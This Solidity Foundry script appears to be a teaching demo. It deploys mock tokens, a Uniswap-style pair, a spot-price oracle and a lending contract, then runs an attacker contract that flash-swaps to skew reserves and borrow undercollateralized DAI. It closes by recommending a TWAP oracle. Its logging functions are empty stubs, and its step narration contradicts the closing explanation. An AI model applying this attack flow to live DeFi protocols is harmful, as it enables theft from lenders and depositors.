// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "./Deploy.s.sol";
import "../src/attackers/Attacker_Oracle.sol";
import "../src/dex/interfaces/IUniV2Pair.sol";

contract DemoOracleAttack is Script {
    DeployScript public deploy;
    Attacker_Oracle public attacker;
    
    function run() external {
        
        address deployer = msg.sender;
        
        // 1. Deploy infrastructure
        deploy = new DeployScript();
        deploy.run();
        
        (
            address tokenA,
            address tokenB,
            address dai,
            ,
            ,
            ,
            address pairAB,
            address oracleSpot,
            ,
            ,
            address lending,
            ,
            ,
        ) = deploy.getAddresses();
        
        console("=== ORACLE MANIPULATION ATTACK DEMO ===");
        console("");
        
        // 2. Show initial state
        console("Initial State:");
        (uint112 r0, uint112 r1,) = IUniV2Pair(pairAB).getReserves();
        console("  Pair reserves:", uint256(r0) / 1e18, "tokenA,", uint256(r1) / 1e18, "tokenB");
        
        uint256 priceA = OracleSpot(oracleSpot).getPrice(tokenA);
        console("  TokenA price:", priceA / 1e18, "tokenB");
        
        // 3. Deploy attacker
        attacker = new Attacker_Oracle(
            pairAB,
            lending,
            tokenA,
            dai
        );
        
        // 4. Fund attacker
        MockERC20(tokenA).mint(address(attacker), 10000 * 1e18);
        
        console("");
        console("Attacker deployed and funded with 10,000 tokenA");
        
        // 5. Execute attack
        console("");
        console("Executing attack...");
        console("  Step 1: Flash swap 20,000 tokenA from pair");
        console("  Step 2: Price manipulated - tokenA now appears cheaper");
        console("  Step 3: Deposit small collateral to lending");
        console("  Step 4: Borrow large amount of DAI (undercollateralized)");
        console("  Step 5: Repay flash swap");
        console("  Step 6: Keep borrowed DAI as profit!");
        
        try attacker.attack(20000 * 1e18, 10000 * 1e18) {
            console("");
            console("Attack successful!");
            
            // 6. Show final state
            uint256 profit = MockERC20(dai).balanceOf(address(attacker));
            console("  Attacker profit:", profit / 1e18, "DAI");
            console("  Lending protocol is now undercollateralized!");
            
        } catch Error(string memory reason) {
            console("Attack failed");
        }
        
        console("");
        console("=== EXPLANATION ===");
        console("This attack exploits OracleSpot which reads price directly from reserves.");
        console("By manipulating reserves in the same transaction, attacker can:");
        console("1. Make collateral appear more valuable than it is");
        console("2. Borrow more than they should be able to");
        console("3. Profit while leaving protocol undercollateralized");
        console("");
        console("MITIGATION: Use TWAP oracle instead of spot price!");
    }
    
    function console(string memory s) internal pure {
        // In a real script, this would use console.log
        // For demo, we just have the structure
    }
    
    function console(string memory s, uint256 a, string memory t) internal pure {}
    function console(string memory s, uint256 a, string memory t, uint256 b, string memory t2) internal pure {}
}

